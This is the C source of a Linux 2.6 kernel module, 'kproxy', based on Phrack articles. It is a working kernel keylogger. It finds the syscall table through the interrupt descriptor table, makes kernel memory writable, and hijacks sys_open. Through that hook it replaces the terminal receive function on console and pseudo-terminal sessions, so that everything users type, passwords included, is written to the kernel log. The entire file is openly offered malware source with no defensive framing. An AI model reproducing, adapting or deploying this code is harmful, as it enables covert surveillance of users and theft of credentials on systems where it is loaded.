/*
 *  kproxy 0.1
 *
 *  Based loosely on code from:
 *
 *  Volume 0x0b, Issue 0x3a, Phile #0x07 of 0x0e 
 *      Linux on-the-fly kernel patching without LKM 
 *  and 
 *  Volume 0x0b, Issue 0x3b, Phile #0x0e of 0x12 
 *      Writing Linux Kernel Keylogger
 *
 *  Many fixes for 2.6
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 *
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h> /* printk() */
#include <linux/errno.h>  /* error codes */
#include <linux/types.h>  /* size_t */

// For hacking sys_call_table
#include <asm-i386/cacheflush.h>  
#include <asm/page.h>  

// For tty keylogging
#include <linux/tty.h>    /* struct tty_struct */
//#include <linux/tty_driver.h>    /* struct tty_driver */
//#include <linux/smp_lock.h>
//#include <linux/sched.h>
//#include <linux/unistd.h>
//#include <linux/string.h>
#include <linux/file.h>
#include <asm/uaccess.h>  /* mm_segment_t, access_ok() */
#include <linux/proc_fs.h>
//#include <asm/errno.h>
//#include <asm/io.h>

#include <linux/kfifo.h>  /* kfifo circular buffers */
#include <linux/spinlock.h>  /* spinlock_t  */

MODULE_LICENSE("GPL");

#define CALLOFF 100     /* we'll read first 100 bytes of int $0x80*/
// XXX - BUF_SIZE must be a power of two
#define BUF_SIZE 128    /* circular buffer size for struct tty_log */
// Simplifies moving to kernel memory context
#define BEGIN_KMEM { mm_segment_t old_fs = get_fs(); set_fs(get_ds());
#define END_KMEM set_fs(old_fs); }

// XXX - check to see if these hacked together versions work
// Macros to find which tty we are dealing with
#define TTY_NUMBER(tty) MINOR(tty_devnum((tty))) - (tty)->driver->minor_start \
    + (tty)->driver->name_base

#define TTY_INDEX(tty) tty->driver->type == \
    TTY_DRIVER_TYPE_PTY?MAX_TTY_CON + \
    TTY_NUMBER(tty):TTY_NUMBER(tty)


// defines for max connections
#define MAX_TTY_CON 8
#define MAX_PTS_CON 256

struct {
    unsigned short limit;
    unsigned int base;
} __attribute__ ((packed)) idtr;

struct {
    unsigned short off1;
    unsigned short sel;
    unsigned char none,flags;
    unsigned short off2;
} __attribute__ ((packed)) idt;

// This holds bookkeeping info for ttys
struct tty_log 
{
    struct tty_struct *tty;     // ptr to the tty 
    struct kfifo *kfifo_buf;    // ptr to circ. buffer to hold incomming data
    spinlock_t lock; 
    int count;
};

struct tty_log* logbook[MAX_TTY_CON + MAX_PTS_CON] = { NULL };

// function pointer to the original sys_open before it's hijacked
asmlinkage int (*original_sys_open)(const char *, int, int);

// function pointer to save the origanial buffer processing fucntion
void (*old_receive_buf)(struct tty_struct *, const unsigned char *, char *,
        int);

// WHen we fill our char buffer in logbook, write to file and reset count
// We will implement all the fancy logic here? except maybe special characters
// like ctrl, alt, etc.
void flush_buf(int index)
{
    char buf[BUF_SIZE];
    kfifo_get(logbook[index]->kfifo_buf, buf, logbook[index]->count);
    buf[logbook[index]->count] = '\0';
    printk(KERN_ALERT "%s", buf);

    logbook[index]->count = 0;
}

// our hijacked receive_buf function
void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp,
        int count)
{
    if (!tty->real_raw && !tty->raw)  // ignore raw mode
    {
        // append this data to our circular buffer 
        kfifo_put(logbook[TTY_INDEX(tty)]->kfifo_buf, cp, count);
        logbook[TTY_INDEX(tty)]->count += count;

        // XXX - hack so we don't overwrite our buffer before flushing
        if ( logbook[TTY_INDEX(tty)]->count >= BUF_SIZE - 10)
        {
            flush_buf(TTY_INDEX(tty));
        }
        //logger_process(tty, cp, count);
    }
    (*old_receive_buf)(tty, cp, fp, count);
}

// This function checks to see if we have a buffer delcared for it
// and/or actually replaces the recv_buf function
static inline void init_tty(struct tty_struct *tty, int tty_index)
{
    struct tty_log *tmp_log;

    if (logbook[tty_index] == NULL)
    {
        tmp_log = kmalloc(sizeof(struct tty_log), GFP_KERNEL);
        memset(tmp_log, 0, sizeof(struct tty_log));

        tmp_log->tty = tty;
        tmp_log->lock = SPIN_LOCK_UNLOCKED;
        tmp_log->kfifo_buf = kfifo_alloc(BUF_SIZE, GFP_KERNEL, &tmp_log->lock);
        tty->ldisc.receive_buf = new_receive_buf;
        logbook[tty_index] = tmp_log;
    }
    else
    {
        // TODO - maybe clear the tty_log buf here
        tty->ldisc.receive_buf = new_receive_buf;
    }

}

// our hijacked sys_open function
asmlinkage int new_sys_open(const char *filename, int flags, int mode)
{
    int ret;
    struct file * file;
    static int fl = 0;
    ret = (*original_sys_open)(filename, flags, mode);

    if (ret > 0)
    {
        struct tty_struct * tty;

        // Get back into kernel memory so we can move data back and forth
        BEGIN_KMEM
            lock_kernel();

        // get the file pointer from the fd and 
        file = fget(ret);
        if (file != NULL)
        {
            tty = file->private_data;

            // Check to see if tty exists, that it matches a TTY console driver
            // and it has a valid tty number.  or that it matches a remote session
            // and in addition that it has a receive_buf and we haven't already 
            // hijacked it  XXX - >= 10000 hack to prevent nontty with valid
            // driver values
            if (tty != NULL && tty->driver != NULL && 
                    tty->driver >= (struct tty_driver *)0xc0000000 &&
                    ((tty->driver->type == TTY_DRIVER_TYPE_CONSOLE &&
                      TTY_NUMBER(tty) < MAX_TTY_CON - 1 ) || (tty->driver->type
                      == TTY_DRIVER_TYPE_PTY && tty->driver->subtype ==
                      PTY_TYPE_SLAVE && TTY_NUMBER(tty) < MAX_PTS_CON)) &&
                    tty->ldisc.receive_buf != NULL && tty->ldisc.receive_buf !=
                    new_receive_buf) 
            {
                // fl is a flag to check if we have saved the old_receive_buf yet
                if (!fl) 
                {
                    old_receive_buf = tty->ldisc.receive_buf;
                    fl = 1;
                }
                init_tty(tty, TTY_INDEX(tty));
            }
        }

        fput(file);

        // Get out of kernel memory and clean up after ourselves
        unlock_kernel();
        END_KMEM

    } 
    //printk(KERN_ALERT "ending sysopen\n");

    return ret;
}


// implementation of memmem since the kernel doesn't provide one for me
// used to find the call <something>(,eax,4) after the idt (something) is
// the location of the sys_call_table
void *memmem(const void* haystack, size_t hl, const void* needle, size_t nl)
{
    int i;
    if (nl>hl) return 0;
    for (i=hl-nl+1; i; --i) {
        if (!memcmp(haystack,needle,nl))
            return (char*)haystack;
        ++haystack;
    }
    return 0;
}

// Function will set sct to the address of the syscall table
void find_sys_call_table(unsigned **sct)
{
    unsigned sys_call_off;
    char sc_asm[CALLOFF],*p;

    // ask processor for interrupt discriptor table
    asm ("sidt %0" : "=m" (idtr));

    /* read-in IDT for 0x80 vector (syscall) */
    memcpy(&idt,(void *)idtr.base+8*0x80,sizeof(idt));
    sys_call_off = (idt.off2 << 16) | idt.off1;

    memcpy(sc_asm,(void *)sys_call_off,CALLOFF);

    /* we have syscall routine address now, look for syscall table
       dispatch (indirect call) */
    p = (char*)memmem (sc_asm,CALLOFF,"\xff\x14\x85",3);

    if (p)
        *sct = (void *)*(unsigned*)(p+3);
    else
        *sct = NULL;
}

// entry point of our module
static int kproxy_init(void)
{
    unsigned *sct;
    struct page *pg;
    pgprot_t prot;

    // Get the location of the syscall table
    find_sys_call_table(&sct); 

    // fix kernel page permissions
    pg = virt_to_page(sct);
    prot.pgprot = VM_READ | VM_WRITE | VM_EXEC;  /* R-W-X */

    change_page_attr(pg, 1, prot);
    global_flush_tlb();

    original_sys_open = sct[__NR_open];  
    //printk(KERN_ALERT "Syscall table @ 0x%x\n", *sct);
    //printk(KERN_ALERT "ORIG: 0x%x \n", original_sys_open);
    //printk(KERN_ALERT "addr of __NR_open: 0x%x \n", &sct[__NR_open]);
    sct[__NR_open] = new_sys_open;  
    printk(KERN_ALERT "DONE\n");

    return 0;
}

static void kproxy_exit(void)
{
    unsigned *sct;
    struct page *pg;
    int i;
    pgprot_t prot;

    find_sys_call_table(&sct);

    if (sct != NULL)
    {	
        sct[__NR_open] = original_sys_open;  

        // fix kernel page permissions
        pg = virt_to_page(sct);
        prot.pgprot = VM_READ | VM_EXEC;  /* R-W-X */
        change_page_attr(pg, 1, prot);
        global_flush_tlb();
    }

    // Fix our tty buffers so we don't break shit when leaving
    for (i = 0; i < MAX_TTY_CON + MAX_PTS_CON; i++)
    {
        if (logbook[i] != NULL)
            logbook[i]->tty->ldisc.receive_buf = old_receive_buf;
    }

    // Free memory that was used to allocate struct tty_log
    for (i = 0; i < MAX_TTY_CON + MAX_PTS_CON; i++)
    {
        if (logbook[i] != NULL)
        {
            kfree(logbook[i]->kfifo_buf);
            kfree(logbook[i]);
        }
    }
}

module_init(kproxy_init);
module_exit(kproxy_exit);
